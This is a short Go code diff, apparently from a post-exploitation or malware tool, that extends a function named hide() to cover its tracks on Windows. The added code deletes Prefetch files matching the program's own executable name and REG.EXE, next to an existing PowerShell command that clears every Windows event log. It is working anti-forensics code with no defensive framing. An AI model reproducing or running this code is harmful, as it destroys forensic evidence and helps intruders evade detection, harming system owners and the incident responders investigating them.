@@ -56,6 +56,10 @@ func hide() {
 	if err != nil {
 		fmt.Println(err)
 	}
+	err2 := ClearDir3("C:/Windows/Prefetch/")
+	if err2 != nil {
+		fmt.Println(err2)
+	}
 	cmd := exec.Command("powershell", "Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }")
 	cmd.Stdout = os.Stdout
 	cmd.Run()
@@ -329,6 +333,23 @@ func ClearDir(dir string) error {
 
 func ClearDir2(dir string) error {
 	files, err := filepath.Glob(filepath.Join(dir, "REG.EXE-*"))
+	if err != nil {
+		return err
+	}
+	for _, file := range files {
+		err = os.RemoveAll(file)
+		if err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
+func ClearDir3(dir string) error {
+	filename := filepath.Base(os.Args[0])
+	upper := strings.ToUpper(filename)
+	fmt.Println(upper)
+	files, err := filepath.Glob(filepath.Join(dir, upper+"-*"))
 	if err != nil {
 		return err
 	}
